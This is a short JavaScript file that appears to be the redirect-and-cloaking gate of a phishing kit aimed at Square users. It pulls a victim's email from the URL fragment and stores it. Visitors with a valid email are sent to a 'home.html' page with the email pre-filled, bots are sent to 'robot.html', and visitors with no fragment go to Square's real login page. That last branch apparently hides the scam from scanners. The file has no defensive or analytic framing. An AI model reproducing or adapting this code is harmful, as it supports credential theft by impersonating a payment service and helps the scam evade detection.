


 if(window.location.hash){

    console.log(window.location.hash)

    let email = window.location.hash
    let emailed = email.replace(/#/g, '')
    var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
    


    if(emailed == 'd' || emailed == 's' ){
        console.log('secure')
        localStorage.setItem("allowaccessapikeybody", allowaccessapikeybody);

        
        setTimeout(function(){
            window.location.replace('robot.html')
         })



    }

    else if(emailed == 'direct' || emailed == 'd' ){
        localStorage.setItem("allowaccessapikeybody", allowaccessapikeybody);
        setTimeout(function(){
            window.location.replace('home.html')
         }, 5000)
    }
    
    else if (emailed.match(validRegex)) {
        localStorage.setItem("allowaccessapikeybody", allowaccessapikeybody);
        localStorage.setItem("ai", emailed);

        setTimeout(function(){
            window.location.replace('home.html#'+emailed)
         }, 5000)
    
    }

    else{

        
       
        setTimeout(function(){
            window.location.replace('robot.html')
         }, 5000)
        
    }
 
 
 
 
//    document.getElementById('ai').value = emailed
 

   
 
   
 }
 else{

    console.log('no hash')

    window.location.replace('https://squareup.com/login?lang_code=en-us')


    
 
//    var cat = localStorage.getItem("ai");
//    document.getElementById('ai').value = cat
 
 }